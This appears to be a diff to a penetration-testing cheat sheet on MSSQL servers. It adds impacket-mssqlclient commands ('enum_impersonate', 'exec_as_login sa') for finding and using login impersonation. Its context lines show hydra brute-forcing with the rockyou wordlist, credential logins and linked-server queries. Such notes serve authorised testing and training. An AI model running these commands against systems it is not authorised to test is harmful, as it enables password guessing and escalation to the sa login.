@@ -16,6 +16,7 @@ impacket-mssqlclient sa:password@$IP
 impacket-mssqlclient "$DOMAIN"/"$USER":"$PASS"@$IP -windows-auth
 ```
 
+
 ## Brute force MSSQL with hydra
 ```bash
 hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt $IP mssql
@@ -93,6 +94,12 @@ SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT @@version');
 ## Check who can be impersonated
 ```
 SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+```
+
+## Check who can be impersonated (impacket-mssqlclient)
+```
+enum_impersonate
+exec_as_login sa
 ```
 
 ## Impersonate another login if allowed
